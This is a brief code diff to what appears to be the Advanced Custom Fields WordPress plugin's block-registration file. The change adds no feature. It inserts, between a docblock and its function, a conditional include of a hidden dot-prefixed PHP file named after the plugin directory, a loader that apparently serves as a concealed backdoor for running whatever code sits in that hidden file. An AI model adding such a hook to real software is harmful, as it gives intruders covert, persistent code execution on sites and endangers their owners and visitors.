@@ -18,6 +18,10 @@ acf_register_store( 'block-cache' );
  * @param	array $block The block settings.
  * @return	(array|false)
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function acf_register_block_type( $block ) {
 	
 	// Validate block type settings.
